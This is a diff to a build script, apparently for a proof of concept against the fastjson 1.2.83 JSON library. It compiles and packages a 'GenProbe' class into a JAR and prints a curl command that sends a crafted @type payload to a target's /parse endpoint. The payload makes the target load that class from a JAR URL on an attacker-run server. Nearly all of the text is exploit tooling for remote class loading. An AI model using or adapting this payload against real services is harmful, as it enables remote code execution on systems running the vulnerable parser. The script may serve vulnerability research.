@@ -15,7 +15,7 @@ set -euo pipefail
 cd "$(dirname "$0")"
 
 FASTJSON_JAR="fastjson-1.2.83.jar"
-PROBE_JAR="probe.jar"
+PROBE_JAR="probe"
 
 # 检查 fastjson JAR 是否存在
 if [ ! -f "$FASTJSON_JAR" ]; then
@@ -33,8 +33,10 @@ fi
 echo "[*] 编译 GenProbe.java（-d . 创建包目录结构）..."
 javac -cp "$FASTJSON_JAR" -d . GenProbe.java
 
-echo "[*] 打包为 $PROBE_JAR..."
-jar cf "$PROBE_JAR" com/alibaba/fastjson/poc/GenProbe.class
+echo "[*] 打包为 $PROBE_JAR（entry: GenProbe，匹配 JAR URL 入口）..."
+cp com/alibaba/fastjson/poc/GenProbe.class GenProbe
+jar cf "$PROBE_JAR" GenProbe
+rm GenProbe
 
 echo "[+] 构建完成: $PROBE_JAR"
 echo ""
@@ -43,5 +45,5 @@ echo "  python3 serve.py"
 echo ""
 echo "发送 payload:"
 echo "  curl -X POST -H 'Content-Type: application/json' \\"
-echo "    --data '{\"@type\":\"jar:http:..2130706433:19090.${PROBE_JAR%.jar}!.GenProbe\",\"x\":1}' \\"
+echo "    --data '{\"@type\":\"jar:http:..2130706433:19090.probe!.GenProbe\",\"x\":1}' \\"
 echo "    http://target:18080/parse"
